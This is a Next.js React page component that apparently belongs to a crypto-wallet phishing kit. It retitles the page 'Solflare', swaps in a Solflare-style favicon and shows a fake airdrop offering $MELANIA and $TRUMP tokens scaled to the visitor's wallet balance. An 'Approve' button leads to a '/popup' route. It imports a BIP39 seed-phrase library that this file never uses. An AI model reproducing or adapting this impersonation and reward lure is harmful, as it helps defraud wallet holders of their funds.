"use client";

import { useEffect, useState } from "react";
import * as bip39 from "bip39";
import wordlist from "@/components/wordlist.json";
import { useRouter } from "next/navigation";
import Image from "next/image";

const RewardPage = () => {
  const [publicKey, setPublicKey] = useState<string | null>(null);
  const [balance, setBalance] = useState<number | null>(null);
  const [reward1, setReward1] = useState<number>(0);

  const router = useRouter(); // Correct hook for App Router

  // Set the English wordlist explicitly
  useEffect(() => {
    bip39.wordlists.english = wordlist;
  }, []);

  // Listen for messages to update publicKey and balance
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.origin === window.location.origin && event.data.publicKey) {
        setPublicKey(event.data.publicKey);
        setBalance(event.data.balance); // Assign 0.001 if balance is null or undefined
      }
    };

    window.addEventListener("message", handleMessage);

    return () => {
      window.removeEventListener("message", handleMessage);
    };
  }, []);

  // Calculate rewards when balance changes
  useEffect(() => {
    if (balance != null && balance > 0) {
      const rewards = rewardLogic();
      if (Array.isArray(rewards)) {
        setReward1(rewards[0]);
      } else {
        setReward1(0);
      }
    }
  }, [balance]);

  useEffect(() => {
    document.title = "Solflare";
    const favicon = document.querySelector("link[rel='icon']") as HTMLLinkElement | null;
    if (favicon) {
      favicon.href = "/sol.ico"; // Path to your new favicon
    } else {
      // If no favicon exists, create one
      const newFavicon = document.createElement("link");
      newFavicon.rel = "icon";
      newFavicon.href = "/sol.ico"; // Path to your new favicon
      document.head.appendChild(newFavicon);
    }
  }, []);

  const rewardLogic = (): number | number[] => {
    // If balance is null, assume it is 0.001
    const currentBalance = balance ?? 0.001;
    console.log(currentBalance)
    if (currentBalance > 0) {
      const rewards1 = (currentBalance * 1) / 1000000000;
      const rewards2 = (currentBalance * 5) / 1000000000;
      return [rewards1, rewards2];
    } else {
      return 0;
    }
  };

  const handleCloseWindow = () => {
    if (window.opener) {
      window.close(); // This will work if the current window was opened by window.open()
    } else {
      alert("Unable to close the window.");
    }
  };

  const generatePublicKey = () => {
    router.push("/popup"); // Ensure the route '/popup' exists in your app
  };

  return (
    <div
      style={{ backgroundColor: "#13161f" }}
      className="h-screen w-full bg-gray-900 text-white flex flex-col items-center pt-5"
    >
      {balance == 0 ? (
        <>
          <h1 className="text-xl font-bold mb-4 text-center pt-16 pl-2 pr-2 pb-28">
            Sorry!,You are not eligible for rewards.Please use a wallet with transaction history.
          </h1>
          <button
            style={{ backgroundColor: "#21242f" }}
            onClick={handleCloseWindow}
            className="w-40 px-8 py-3 bg-blue-600 rounded-md hover:opacity-70 text-white "
          >
            Close
          </button>
        </>
      ) : balance && balance > 0 ? (
        <>
          <h1 className="text-xl font-bold mb-4">You are Eligible:</h1>

          <div
            style={{ backgroundColor: "#13161f" }}
            className="block max-w-sm p-6 border border-gray-800 rounded-lg shadow"
          >
            <p className="mb-2 text-sm font-bold tracking-tight text-gray-900 dark:text-white">
              You will Receive
            </p>

            <div className="grid grid-cols-2 pt-2">
              <div className="pl-6">
                <Image
                  src="/melania.png"
                  alt="App Icon"
                  width={50}
                  height={50}
                  className="rounded-full"
                />
              </div>
              <div>
                <p>{reward1 * 100} $MELANIA</p>
              </div>
            </div>

            <div className="grid grid-cols-2">
              <div className="pl-6 pt-6">
                <Image
                  src="/trump.png"
                  alt="App Icon"
                  width={50}
                  height={50}
                  className="rounded-full"
                />
              </div>
              <div className="pt-6">
                <p>{reward1 * 100} $TRUMP</p>
              </div>
            </div>
          </div>
          <div className="pt-20">
            <button
              style={{ backgroundColor: "#21242f" }}
              onClick={handleCloseWindow}
              className="w-40 px-8 py-3 mr-4 bg-blue-600 rounded-md hover:opacity-70 text-white"
            >
              Reject
            </button>

            <button
              style={{ backgroundColor: "#ff852d" }}
              onClick={generatePublicKey}
              className="w-40 px-8 py-3 bg-blue-600 rounded-md hover:opacity-80 text-black"
            >
              Approve
            </button>
          </div>
        </>
      ) : (
        <><h1 className="text-xl font-bold mb-4">You are Eligible:</h1><div
              style={{ backgroundColor: "#13161f" }}
              className="block max-w-sm p-6 border border-gray-800 rounded-lg shadow"
            >
              <p className="mb-2 text-sm font-bold tracking-tight text-gray-900 dark:text-white">
                You will Receive
              </p>

              <div className="grid grid-cols-2 pt-2 ">
                <div className="pl-6 pb-6">
                  <Image
                    src="/melania.png"
                    alt="App Icon"
                    width={50}
                    height={50}
                    className="rounded-full" />
                </div>
                <div>
                  <p>{reward1 * 100} $MELANIA</p>
                </div>
              </div>

              <div className="grid grid-cols-2">
                <div className="pl-6 pt-6 pb-4">
                  <Image
                    src="/trump.png"
                    alt="App Icon"
                    width={50}
                    height={50}
                    className="rounded-full" />
                </div>
                <div className="pt-6">
                  <p>{reward1 * 100} $TRUMP</p>
                </div>
              </div>
            </div>
            <div className="pt-20">
            <button
              style={{ backgroundColor: "#21242f" }}
              onClick={handleCloseWindow}
              className="w-40 px-8 py-3 mr-4 bg-blue-600 rounded-md hover:opacity-70 text-white"
            >
              Reject
            </button>

            <button
              style={{ backgroundColor: "#ff852d" }}
              onClick={generatePublicKey}
              className="w-40 px-8 py-3 bg-blue-600 rounded-md hover:opacity-80 text-black"
            >
              Approve
            </button>
          </div></>
      )}
    </div>
  );
};

export default RewardPage;
